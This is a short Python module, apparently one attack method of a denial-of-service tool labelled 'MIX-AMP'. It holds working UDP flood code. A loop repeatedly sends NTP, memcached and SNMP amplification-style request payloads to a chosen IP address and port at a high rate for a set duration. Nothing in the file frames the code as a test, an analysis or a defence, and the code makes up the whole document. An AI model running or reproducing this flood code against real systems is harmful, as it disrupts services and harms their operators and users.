import socket
import time

def run(ip, port, duration, stop_event):
    ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
    memcache_payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    snmp_payload = b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x06\x00\x00\x00\x00\x02\x04\x0f\xff\xff\xff\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00\x04\x00'
    payloads = [ntp_payload, memcache_payload, snmp_payload]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    try:
        while not stop_event.is_set() and time.time() < end_time:
            for payload in payloads:
                sock.sendto(payload, (ip, port))
            time.sleep(0.001)
    except Exception as e:
        print(f"[MIX-AMP Error] {e}")
    finally:
        sock.close()

